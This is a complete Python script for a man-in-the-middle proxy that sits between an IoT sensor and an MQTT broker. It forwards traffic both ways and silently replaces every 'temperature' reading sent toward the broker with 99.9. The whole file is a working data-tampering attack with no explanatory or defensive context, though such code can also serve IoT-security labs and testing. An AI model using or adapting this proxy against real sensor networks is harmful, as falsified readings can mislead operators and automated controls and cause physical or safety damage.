import socket
import threading
import sys

BROKER_HOST = "192.168.0.156"
BROKER_PORT = 1883
PROXY_HOST = "0.0.0.0"
PROXY_PORT = 1884

def handle_client(client_socket):
    broker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    broker_socket.connect((BROKER_HOST, BROKER_PORT))
    
    def forward(source, dest, direction):
        while True:
            data = source.recv(4096)
            if not data:
                break
            
            if direction == "client->broker":
                try:
                    decoded = data.decode('utf-8')
                    if '"temperature":' in decoded:
                        import re
                        modified = re.sub(r'"temperature":\s*[\d\.]+', '"temperature": 99.9', decoded)
                        data = modified.encode('utf-8')
                        print(f"MODIFIED: {decoded[:50]} -> {modified[:50]}...")
                except:
                    pass
            
            dest.send(data)
        source.close()
    
    t1 = threading.Thread(target=forward, args=(client_socket, broker_socket, "client->broker"))
    t2 = threading.Thread(target=forward, args=(broker_socket, client_socket, "broker->client"))
    t1.start()
    t2.start()
    t1.join()
    t2.join()

def start_proxy():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((PROXY_HOST, PROXY_PORT))
    server.listen(5)
    print(f"MITM Proxy listening on {PROXY_HOST}:{PROXY_PORT}")
    print(f"Configure sensor to connect here instead of direct broker")
    
    while True:
        client_socket, addr = server.accept()
        print(f"Client connected from {addr}")
        threading.Thread(target=handle_client, args=(client_socket,)).start()

if __name__ == "__main__":
    start_proxy()
